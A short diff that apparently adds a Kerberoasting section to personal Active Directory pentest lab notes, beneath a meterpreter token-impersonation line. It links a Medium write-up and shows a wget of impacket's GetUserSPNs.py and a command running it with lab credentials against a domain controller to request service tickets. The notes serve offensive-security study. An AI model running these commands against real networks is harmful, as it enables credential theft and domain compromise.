@@ -117,6 +117,13 @@ meterpreter > impersonate_token marvel\\administrator
 
 MITIGATION FOR TOKEN IMPERSONATION
 
+KERBEROASTING
+https://medium.com/@Shorty420/kerberoasting-9108477279cc
+wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUserSPNs.py
+
+┌──(root💀kali)-[/home/XX/impacket/examples]
+└─# python GetUserSPNs.py MARVEL.local/fcastle:Pa$$word -dc-ip 192.168.0.28 -request
+
 
 
 
